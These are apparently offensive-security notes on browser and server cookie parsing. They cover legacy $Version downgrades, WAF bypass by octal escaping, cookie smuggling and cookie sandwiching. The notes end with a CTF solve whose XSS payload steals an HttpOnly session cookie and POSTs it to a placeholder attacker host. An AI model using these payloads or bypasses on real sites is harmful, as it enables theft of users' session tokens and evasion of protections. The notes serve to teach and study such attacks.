# Specifications

### Set-Cookie Header and Domain attribute behaviour
[cookie.domain](http://web.archive.org/web/20250528122100/bayou.io/draft/cookie.domain.html)

-    If the server omits the Domain attribute, the user agent will return the cookie only to the origin server. But some browsers might set domain attribute as the host name. For example, if example.com returns a Set-Cookie header without a Domain attribute, these user agents will erroneously send the cookie to www.example.com as well.

- If the Set-Cookie header field does not have a Domain attribute, the effective domain is the domain of the request.

- If there is a Domain attribute present, its value will be used as effective domain (if the value does not start with a . it will be added by the client).

-  If the user agent receives a new cookie with the same cookie-name, domain-value, and path-value as a cookie that it has already stored, the existing cookie is evicted and replaced with the new cookie.


### Cookies and domain attribute

-  The Domain attribute specifies those hosts to which the cookie will be sent.

- If a cookie's domain attribute is not set, the cookie is only applicable to its origin domain.

- The cookie's domain must not be a TLD, a public suffix, or a parent of a public suffix. If thats the case , the cookie is ignored.

- If the domain is www.example.com , it **cannot** set cookies for any.example.com, but can set cookies for its parrent domain ,for example domain = example.com (possibly overwriting an existing "example.com" cookie set by any.example.com , [Weak Integrity](https://www.rfc-editor.org/rfc/rfc6265#section-8.6) ) .

- Cookie set with domain = .example.com will be sent to subdomains like www.example.com as , a leading %x2E ("."), if present, is ignored 

- Cookies set with domain = example.com will be converted  to domain = .example.com sometimes.

- [Weak Confidentiality](https://www.rfc-editor.org/rfc/rfc6265#section-8.5) : Cookies do not provide isolation by port.  If a cookie is readable/writable by a service running on one port, the cookie is also readable/writable by a service running on another port of the same server.

- ! Cookies and the security they provide relay completely on DNS [Reliance on DNS](https://www.rfc-editor.org/rfc/rfc6265#section-8.7)

#### __Host- prefix

Cookies with names starting with __Host- are sent only to the host subdomain or domain that set them, and not to any other host. 
- They must be set with the `secure` flag
- must be from a secure page (HTTPS)
- must not have a `domain` specified
-  and the path must be `/`.

__Host- prefixed cookies cannot be sent to superdomains or subdomains


## Cookie Ordering

[Cookie-bugs-and-features](https://blog.ankursundara.com/cookie-bugs/)


Cookies forged by the browsers and sent back to server , are methodically arranged in the Cookie Header following these two rules:

1. Path length, longest to shortest : i.e. the `path` attribute of the cookie in the `document.cookie =` directive when setting with js code.

2. Last updated time, least recent to most recent: or maybe the creation time if the cookies never updated.


## Empty Cookie 

Browsers sometimes allow this behaviour:

```
document.cookie = "=test value;"
```

```
 test value;
```
So you may exploit this as follows :

```
function setCookie(name, value) {
    document.cookie = `${name}=${value}`;
}

setCookie("", "a=b"); 
```

Will result in :

```
Cookie : a=b;
```

### Unicode values

Unicode values completely breaks some apps like Chrome.

for example if you set a cookie with a unicode value like ` document.cookie = "\u0123"` Chrome discards the cookie.





# Exploiting Legacy Cookies

[Table](https://grayduck.mn/2024/11/21/handling-cookies-is-a-minefield/#summary-table)

### RFC6265 Specifications

The Server has to construct cookies following this rules : 

- set-cookie        = set-cookie-string
- set-cookie-string = BWS cookie-pair *( BWS ";" OWS cookie-av )
- cookie-pair       = cookie-name BWS "=" BWS cookie-value
- cookie-name       = 1*cookie-octet
- cookie-value      = *cookie-octet / ( DQUOTE *cookie-octet DQUOTE )
- cookie-octet      = %x21 / %x23-2B / %x2D-3A / %x3C-5B / %x5D-7E
                      
                      ; US-ASCII characters excluding CTLs,
                      
                      ; whitespace DQUOTE, comma, semicolon,
                      
                      ; and backslash

how browsers should accept cookies with this rules:

1. If the set-cookie-string contains a %x00-08 / %x0A-1F / %x7F character
   (CTL characters excluding HTAB):
     Abort these steps and ignore the set-cookie-string entirely.

2. If the set-cookie-string contains a %x3B (";") character:
   The name-value-pair string consists of the characters up to, but not
   including, the first %x3B (";"), and the unparsed-attributes consist
   of the remainder of the set-cookie-string (including the %x3B (";")
   in question).

Otherwise:

 The name-value-pair string consists of all the characters contained inthe set-cookie-string, and the unparsed-attributes is the empty string.


    ! cookies can contain values outside the `%x21`, `%x23-2B`, `%x2D-3A`, `%x3C-5B`, and `%x5D-7E` characters as allowed by Set-Cookie on client side and may reflect back to the HTTP Response and parsed by a browser , or a cookie parsed by some library on the server side.



#### Firefox Example 

this is the check function in the firefox browser for illegal characters in a cookie:

[Firefox Source](https://searchfox.org/mozilla-central/source/netwerk/cookie/CookieCommons.cpp#296)

```
bool CheckCookieStringFromDocument(const nsACString& aCookieString) {
  // If the set-cookie-string contains a %x00-08 / %x0A-1F / %x7F character (CTL
  // characters excluding HTAB): Abort these steps and ignore the
  // set-cookie-string entirely.
  const char illegalCharacters[] = {
      0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x0A, 0x0B, 0x0C,
      0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
      0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x7F, 0x00};

  const auto* start = aCookieString.BeginReading();
  const auto* end = aCookieString.EndReading();

  auto charFilter = [&](unsigned char c) {
    if (StaticPrefs::network_cookie_blockUnicode() && c >= 0x80) {
      return true;
    }
    return std::find(std::begin(illegalCharacters), std::end(illegalCharacters),
                     c) != std::end(illegalCharacters);
  };

  return std::find_if(start, end, charFilter) == end;
}
```

Firefox accepts five characters which RFC recommends that servers not send:

-    0x09 (horizontal tab)
-    0x20 (spaces)
-    0x22 (double quotes)
-    0x2C (commas)
-    0x5C (backslashes)
-    0x3B (semicolons)


It also blocks chars >= 0x80 (non ascii) and also unicode characters  : 

(StaticPrefs::network_cookie_blockUnicode() && c >= 0x80)  

### $Version attribute

[RFC2901](https://datatracker.ietf.org/doc/html/rfc2109#section-4.3.4)

The value of the cookie-version attribute must be the value from the Version attribute, if any, of the corresponding Set-Cookie response header.  Otherwise the value for cookie-version is 0.

$Version is a required attribute, identifying the version of the state management specification to which the cookie conforms.

e.g. Cookie

```
Cookie: $Version=1; foo="bar"; $Path="/"; $Domain=abc;
```

`$Version` applies to the cookie mechanism as a whole (and gives the version number for the cookie mechanism).

#### Cookie Spoofing

Consider:

1.  User agent makes request to victim.cracker.edu, gets back
         cookie session_id="1234" and sets the default domain
         victim.cracker.edu.

2.  User agent makes request to spoof.cracker.edu, gets back
         cookie session-id="1111", with Domain=".cracker.edu".

3.  User agent makes request to victim.cracker.edu again, and passes

`Cookie: $Version="1"; session_id="1234"; session_id="1111"; $Domain=".cracker.edu"`


### Parsers

```
Flask:		{"foo":"bar","$Version":"1","$Path":"/","$Domain":"abc"}
Django:		{"foo":"bar","$Version":"1","$Path":"/","$Domain":"abc"}
PHP:		{"foo":"\"bar\"","$Version":"1","$Path":"\"\/\"","$Domain":"abc"}
Ruby:		{"foo":"\"bar\"","$Version":"1","$Path":"\"\/\"","$Domain":"abc"}
Spring:		{ "foo": "\"bar\""}
SimpleCookie:	{ "foo": "bar"}
```

- If this version attribute is used ,some parsers fall back to their legacy form.

- Some parsers escape characters with a backslash `\`

- Some parsers like Python ones, decode octal escape sequences within quoted strings as follows:

```
"\012" <=> \n
"\015" <=> \r
"\073" <=> ;
```


! Any non-text character is translated into a 4 character sequence: a forward-slash followed by the three-digit octal equivalent of the character.


### WAF Bypass

For example you can use the above to exploit injection vulnerabilities like SQLi and Command  Injection like the following:

```
eval() => allowed
eval('test') => forbidden
"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed
"\145\166\141\154\050\047\164\145\163\164\047\051" => allowed
```

- Bypassing cookie-name blocklists

if `test` is blocked as a cookie name you can bypass this with

`$Version=1; foo=foo, test = testvalue => "test": "testvalue"`

because the RFC2109 permits spaces before and after the `=` sign in the cookie value ,aswell as a `,` separator between name-value pairs.


## Cookie Splitting and Cookie smugling

Some web servers and browsers support legacy RFC's like RFC2965 , which specifies that a cookie key-value pair can have an open quote `"` followed by a semicolon in the end of the pair like so : `key="value;`


This allows hiding malicious payloads by using the Cookie header as a multiline header continuation, and also all kinds of tricks like `cookie smugling` and `cookie sandwitching`.

- Some vulnerable servers in the time of writing are:

  - The Java Webservers Jetty,
  - TomCat,
  - Undertow 
  - the Python web framework Zope,
  - http.cookie.SimpleCookie in python stdlib 
  - http.cookie.BaseCookie in python stdlib


### Spoofing Delimeters

Sometimes its also possible to change the semicolon `;` delimeter to somathing like a comma `,` or a whitespace ` ` in order to confuse the origin server and make it parse the provided value as more than one cookie. 

For example : 
``` name1=value1,CSRF_TOKEN=SPOOFED_VALUE```
might be returned like 2 seperate cookies.

If the duplicate-spoofed value of a cookie is prefered over the original one you might be able to bypass protections like CSRF-Protection, and also spoof __Secure and __Host- Prefixed cookies.


- example

```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```

```
Cookie: name=eval('test') => forbidden 
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```

## Preventing vulnerabilities

- Dont allow legacy support on cookie libraries
- Validate user input
    - against blacklist characters and patterns
    - agains whitelist regex's




# Cookie Sandwitching

1. Browsers dont support legacy rfc's in cookie handling, so `$Version` is allowed and parsed as normal attribute. Also quotes `"` are allowed to be passed into values without closing them.

2. While setting cookies with Javascript's document.cookie like this:
```
document.cookie = `$Version=1`;

document.cookie = `name="value`;
...
documen.cookie = `param2=end"`;
```
the Cookie header is setted like :

```
GET / HTTP/1.1
Cookie: $Version=1; param1="start; sessionId=secret; param2=end"
 =>
HTTP/1.1 200 OK
Set-Cookie: param1="start; sessionId=secret; param2=end";
```
depending on the webserver parsing them.If this happens you can smuggle cookies in the response to steal Httponly set cookies. 

3. In order for legacy parsers to fall under RFC 2109 `$Version` has to be in the begining of the cookie. In order to achieve this you can set the `$Path` attribute to be longer than the one you want to steal ( or be more spesific, for example sessionid might be `$Path=/` so we set ```document.cookie = `$Version=1; domain=vulndomain.com; path="/path";` ```) . 

4. other attributes can be specified by : ```document.cookie = `endvalue=end"; path="/";` ``` , which will "Close the sandwich" providing the closing quote `"`, as the cookie creation in the client side precedes our javascript code execution , for example Reflected XSS.

5. Some application like Python webservers, dont need the $Version attribute as the support encoding special characters to the four-character model ( an `\` followed by three-char octal equivalent of character )

```
GET / HTTP/1.1
Cookie: param1="start; sessionId=secret; param2=end"
 =>
HTTP/1.1 200 OK
Set-Cookie: param1="start\073 sessionId=secret\073 param2=end";
```

## The Attack

1. Find a Code Execution vulnerabillity in the client side, like XSS

2. find the cookies which you want to steal and their attributes, which they might be HttpOnly set.

3. Find a cookie reflecting endpoint , which also accepts CORS requests, if this is a different origin 


4. Craft the XSS Payload so that the Cookie Request header has the downgrading $Version attribute in the preceding evrything else, and also sandwitching the juicy token.

### Example


[DownUnderCTF2025](https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/sweet_treat/solve/WRITEUP.md)

- index.jsp in Apache tomcat:9.0-jdk11

```
  String lang = "en";
  Cookie[] cookies = request.getCookies();
  if (cookies != null) {
      for (Cookie c : cookies) {
          if ("language".equals(c.getName())) {
              lang = c.getValue();
          }
      }
  }

--- SNIP ---
```

- admin/admin-review.jsp

```
<div class="about-content"><%= (aboutMe != null && !aboutMe.isEmpty()) ? aboutMe : "No about me section provided." %></div>
```


So admin-review.jsp is vulnerable to XSS and index.jsp reflects the `language` cookie .

```
<script>
document.cookie = `$Version=1; path=/index.jsp;`;
document.cookie = `language="start; path=/index.jsp;`;
document.cookie = `end="; path=/`;
fetch("/index.jsp").then(function (res){return res.text();}).then(
function (html) {
    console.log("Sending exfil");
    fetch("http://<attacker_lhost>:<attacker_lport>/exfil",
    {
        method: "POST",
        body: html.substring(0,135)
    });
});
</script>
```